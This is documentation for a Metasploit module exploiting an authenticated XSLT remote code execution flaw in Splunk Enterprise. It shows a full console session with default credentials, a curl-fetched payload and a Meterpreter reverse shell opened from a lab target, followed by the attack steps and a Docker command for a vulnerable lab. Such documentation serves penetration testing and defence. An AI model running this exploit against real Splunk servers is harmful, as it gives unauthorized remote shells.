## Vulnerable Application

This Metasploit module exploits a Remote Code Execution (RCE) vulnerability in Splunk Enterprise.
The vulnerability affects versions 9.0.x prior to 9.0.7 and 9.1.x before 9.1.2.
The exploit takes advantage of a flaw in the XSLT transformation functionality of Splunk Enterprise
and requires valid credentials to be executed successfully, with the default credentials often being admin:changeme.

Upon successful exploitation, the attacker is able to execute code with the same privileges as the Splunk service user.
Typically, this user is 'splunk' and the resulting shell will have permissions associated with this user account,
which may vary depending on the specific environment and configuration of the Splunk service.

## Verification Steps
1. **Start Metasploit**: Launch `msfconsole` in your Metasploit framework.
2. **Select the Module**: Use the module with the command `use exploit/unix/http/splunk_xslt_authenticated_rce`.
3. **Disable AutoCheck**: Optionally, you can disable the automatic vulnerability check with `set AutoCheck false`.
4. **Execute the Exploit**: Use the `exploit` command to run the exploit.

## Scenarios
```
[*] No payload configured, defaulting to cmd/linux/http/x64/meterpreter/reverse_tcp
msf6 exploit(unix/http/splunk_xslt_authenticated_rce) > options

Module options (exploit/unix/http/splunk_xslt_authenticated_rce):

   Name             Current Setting  Required  Description
   ----             ---------------  --------  -----------
   PASSWORD         changeme         yes       Password for Splunk
   Proxies                           no        A proxy chain of format type:host:port[,type:host:port][...]
   RANDOM_FILENAME  gWQgBqnz         no        Random filename with 8 characters
   RHOSTS                            yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasp
                                               loit.html
   RPORT            8000             yes       The target port (TCP)
   SSL              false            no        Negotiate SSL/TLS for outgoing connections
   USERNAME         admin            yes       Username for Splunk
   VHOST                             no        HTTP server virtual host


Payload options (cmd/linux/http/x64/meterpreter/reverse_tcp):

   Name                Current Setting  Required  Description
   ----                ---------------  --------  -----------
   FETCH_COMMAND       CURL             yes       Command to fetch payload (Accepted: CURL, FTP, TFTP, TNFTP, WGET)
   FETCH_DELETE        false            yes       Attempt to delete the binary after execution
   FETCH_FILENAME      eXHMuZOtzdPG     no        Name to use on remote system when storing payload; cannot contain spaces.
   FETCH_SRVHOST                        no        Local IP to use for serving payload
   FETCH_SRVPORT       8080             yes       Local port to use for serving payload
   FETCH_URIPATH                        no        Local URI to use for serving payload
   FETCH_WRITABLE_DIR                   yes       Remote writable dir to store payload; cannot contain spaces.
   LHOST               192.168.1.5      yes       The listen address (an interface may be specified)
   LPORT               4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic



View the full module info with the info, or info -d command.

msf6 exploit(unix/http/splunk_xslt_authenticated_rce) > set rhosts chocapikk.lab
rhosts => chocapikk.lab
msf6 exploit(unix/http/splunk_xslt_authenticated_rce) > exploit

[*] Started reverse TCP handler on 192.168.1.5:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] Successfully authenticated on the Splunk instance
[+] The target appears to be vulnerable. Exploitable version found: 9.1.1
[+] Successfully authenticated on the Splunk instance
[*] Extracting CSRF token from cookies
[+] CSRF token successfully extracted: 4066849599386392852
[+] Malicious file uploaded successfully
[*] Sending job search request to /en-US/splunkd/__raw/servicesNS/admin/search/search/jobs
[*] Triggering XSLT transformation at /en-US/api/search/jobs/1701424044.745/results?xsl=/opt/splunk/var/run/splunk/dispatch/1701424043.744/gWQgBqnz.xsl
[+] XSLT transformation triggered successfully
[*] Executing payload at /en-US/splunkd/__raw/servicesNS/admin/search/search/jobs
[+] Payload executed successfully
[*] Sending stage (3045380 bytes) to 172.17.0.2
[*] Meterpreter session 1 opened (192.168.1.5:4444 -> 172.17.0.2:60690) at 2023-12-01 10:47:25 +0100

meterpreter > sysinfo
Computer     : 172.17.0.2
OS           : Red Hat Enterprise Linux 8 (Linux 6.4.10-060410-generic)
Architecture : x64
BuildTuple   : x86_64-linux-musl
Meterpreter  : x64/linux
meterpreter >
```

### Exploitation Process
1. **Authentication**: The module authenticates using provided credentials.
2. **CSRF Token Extraction**: Extracts a CSRF token from the Splunk server for subsequent requests.
3. **Malicious File Upload**: Uploads a malicious XSL file to the server.
4. **Triggering XSLT Transformation**: Initiates an XSLT transformation to execute the payload.
5. **Executing Payload**: Executes the payload, resulting in a reverse shell or similar access.

### Creating a Vulnerable Splunk

```
docker run -p 8000:8000 -e "SPLUNK_PASSWORD=Password^" -e "SPLUNK_START_ARGS=--accept-license" -it splunk/splunk:9.1.1
```
To create a vulnerable user, login with admin, then browse:
settings > users > New User
    Create a new user with the 'user' and 'splunk-system-role' role

### Expected Results
- This exploit requires valid credentials for successful execution.
